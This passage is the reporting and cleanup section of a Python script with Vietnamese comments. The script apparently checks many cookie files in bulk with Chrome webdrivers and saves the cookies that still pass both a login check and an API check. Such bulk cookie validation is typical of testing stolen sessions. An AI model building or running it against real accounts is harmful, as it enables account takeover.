                                                                    for cmd in proc.info.get('cmdline', []))):
                            logger.info(f"Kill process: {name} (PID: {proc.pid})")
                            proc.kill()
                    except:
                        pass
                        
                # Đóng các process với taskkill nếu là Windows
                if platform.system() == "Windows":
                    os.system("taskkill /f /im chromedriver.exe >nul 2>&1")
                    os.system("taskkill /f /im chrome.exe >nul 2>&1")
            except Exception as e:
                logger.error(f"Lỗi khi dọn dẹp process Chrome: {str(e)}")
            
            logger.info("Dọn dẹp tài nguyên hoàn tất")
            logger.info("Thoát chương trình.")

        setup_signal_handlers(cleanup_resources)

        print("\n=== THÔNG TIN CẤU HÌNH ===")
        print(f"Số worker tối đa: {config.max_workers}")
        print(f"Kích thước batch: {config.batch_size}")
        print(f"Thư mục output: {output_dir}")
        print(f"Chrome driver: {config.chrome_driver_path}")
        print(f"URL kiểm tra đăng nhập: {config.login_check_url}")
        print(f"Số domain trong cấu hình: {len(config.domain_url_map)}")
        print(f"Logic xác minh: Đăng nhập thành công VÀ Xác thực API thành công")

        print("\n=== TÀI NGUYÊN HỆ THỐNG ===")
        system_monitor.print_resource_usage()

        print(f"\n=== BẮT ĐẦU XỬ LÝ {len(cookie_files)} FILE ===")
        start_time = time.time()

        # Chạy quy trình kiểm tra
        checker.check_multiple_cookie_files_adaptive(
            cookie_files=cookie_files,
            task_scheduler=task_scheduler,
            batch_size=config.batch_size
        )

        process_time = time.time() - start_time
        
        # Hiển thị báo cáo tóm tắt
        result_summary = result_manager.get_summary()
        print("\n=== KẾT QUẢ KIỂM TRA COOKIE ===")
        result_manager.print_summary()

        # Hiển thị thống kê chi tiết về API xác thực
        if 'api_stats' in result_summary:
            api_stats = result_summary['api_stats']
            print("\n=== THỐNG KÊ XÁC THỰC API ===")
            print(f"Tổng số kiểm tra API: {api_stats.get('total_checked', 0)}")
            if api_stats.get('total_checked', 0) > 0:
                print(f"Thành công: {api_stats.get('success_count', 0)} ({api_stats.get('success_rate', 0):.1f}%)")
                print(f"Thất bại: {api_stats.get('failed_count', 0)} ({100-api_stats.get('success_rate', 0):.1f}%)")
        
        # Hiển thị phân tích chi tiết về lý do không hợp lệ
        if 'invalid_analysis' in result_summary:
            invalid_analysis = result_summary['invalid_analysis']
            print("\n=== PHÂN TÍCH LÝ DO COOKIE KHÔNG HỢP LỆ ===")
            print(f"Đăng nhập thất bại: {invalid_analysis.get('login_failures', 0)}")
            print(f"API thất bại: {invalid_analysis.get('api_failures', 0)}")
            if 'detailed_reasons' in invalid_analysis:
                reasons = invalid_analysis['detailed_reasons']
                if reasons:
                    print("Chi tiết lý do:")
                    for reason, count in reasons.items():
                        reason_text = {
                            'login_failed': 'Đăng nhập thất bại',
                            'api_verification_failed': 'API xác thực thất bại',
                            'other_validation_failed': 'Lỗi xác minh khác'
                        }.get(reason, reason)
                        print(f"  - {reason_text}: {count}")

        print(f"\nThời gian xử lý: {process_time:.2f} giây")
        print(f"Tốc độ xử lý: {len(cookie_files)/process_time:.2f} file/giây")

        print("\n=== TÀI NGUYÊN HỆ THỐNG SAU KHI CHẠY ===")
        system_monitor.print_resource_usage()

        # In thông tin hiệu suất
        performance_report = task_scheduler.get_performance_report()
        print("\n=== THÔNG TIN HIỆU SUẤT ===")
        print(f"Số task đã hoàn thành: {performance_report['tasks_completed']}")
        print(f"Thời gian trung bình mỗi task: {performance_report['avg_task_time']:.2f}s")
        print(f"Tỷ lệ thành công: {performance_report['success_rate']*100:.1f}%")
        print(f"Độ ổn định: {performance_report.get('stability', 0)*100:.1f}%")
        print(f"Tốc độ xử lý: {performance_report.get('processing_rate', 0):.2f} tasks/phút")

        # Hiển thị metrics WebDriverPool
        if driver_pool:
            driver_metrics = driver_pool.get_metrics()
            print("\n=== THÔNG TIN WEBDRIVER POOL ===")
            print(f"Driver đã tạo: {driver_metrics['total_created']}")
            print(f"Driver đã tái sử dụng: {driver_metrics['total_reused']}")
            print(f"Driver đã đóng: {driver_metrics['total_closed']}")
            print(f"Driver đã thất bại: {driver_metrics['total_failed']}")

        # Hiển thị thông tin về cookie hợp lệ
        if result_summary.get('valid_count', 0) > 0:
            print("\n=== THÔNG TIN COOKIE HỢP LỆ ===")
            print(f"Đã lưu {result_summary.get('valid_count', 0)} cookie hợp lệ vào:")
            print(f"  {result_summary.get('output', {}).get('valid_cookies_dir', '')}")
            print("\nNhắc nhở: Cookie hợp lệ là cookie đã đạt CẢ HAI điều kiện:")
            print("  1. Đăng nhập thành công (login_success = True)")
            print("  2. Xác thực API thành công (api_success = True)")

        cleanup_resources()

        logger.info("=== KẾT THÚC CHƯƠNG TRÌNH ===")
        total_time = time.time() - overall_start_time
        logger.info(f"Tổng thời gian chạy: {total_time:.2f} giây")
        print(f"\nTổng thời gian chạy: {total_time:.2f} giây")
        print("\nNhấn Enter để thoát...")
        input()

    except KeyboardInterrupt:
        print("\n\nĐã hủy bởi người dùng.")
        logger.warning("Chương trình bị hủy bởi người dùng")
    except Exception as e:
        print(f"\n⚠ Lỗi không mong đợi: {type(e).__name__}: {str(e)}")
        logger.exception(f"Lỗi không mong đợi: {type(e).__name__}: {str(e)}")
        traceback.print_exc()
    finally:
        if 'resources_to_cleanup' in locals():
            for resource in resources_to_cleanup:
                try:
                    if hasattr(resource, 'shutdown'):
                        resource.shutdown()
                except Exception as e:
                    if 'logger' in locals():
                        logger.error(f"Lỗi khi dọn dẹp trong finally: {str(e)}")
        if 'logger' in locals():
            logger.info("=== KẾT THÚC CHƯƠNG TRÌNH ===")

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"Lỗi nghiêm trọng: {type(e).__name__}: {str(e)}")
        logging.exception("Lỗi nghiêm trọng không xử lý được")
    except KeyboardInterrupt:
        print("\nĐã hủy bởi người dùng.")
    finally:
        print("Thoát chương trình.")
        sys.exit(1)
